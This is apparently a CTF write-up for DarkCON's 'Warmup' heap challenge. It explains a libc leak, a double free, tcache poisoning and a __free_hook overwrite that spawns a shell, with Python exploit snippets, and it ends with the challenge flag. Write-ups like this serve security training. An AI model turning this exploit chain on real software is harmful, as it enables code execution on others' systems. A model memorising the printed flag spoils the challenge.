# [DarkCON CTF] Warmup

## Info

+ 30 solves / 482 points

warm up yourself and get the flag!

## Summary

+ double free
+ tcache poisoning
+ hook overwrite

## File

+ Arch : x86-64
+ Library : dynamically linked (libc6_2.27-3ubuntu1.2_amd64)

## Checksec

+ CANARY : Enabled
+ FORTIRY : Disabled
+ NX : Enabled
+ PIE : Disabled
+ RELRO : Partial

## Description

This is simple `menu` format challenge.
In this challenge, there are 3 important functions to understand how to exploit.

+ main

Print address of _reloc.strcpy

+ create

note index : [0, 0x10)

note size : (0,0x20]

Call malloc() and gets input.

+ delete

Call free() and return without reset address.

## Exploit

**Leak libc address**

```python
p.recvuntil(": ")
strcpy = int(p.recv(14),16)
libc = strcpy - 0xb65b0
system = libc + l.symbols["system"]
free_hook = libc + l.symbols["__free_hook"]
```

The given address is the address of __strcpy_sse2, not strcpy. If you notice this point, you can get libc base address easily.

**Overwrite free_hook**

```python
delete(0)
delete(0)
create(0, 0x10, p64(free_hook))
create(1, 0x10, b"/bin/sh\x00")
create(2, 0x10, p64(system))
delete(1)
```

Since delete() does not reset address table, we can trigger double free by simply deleting same address twice. Tcache double free check does not exist because the library version is < 2.29. 

Now we can call system("/bin/sh") by overwriting free_hook to system() and call free("/bin/sh").

## Flag

+ darkCON{shrtflg}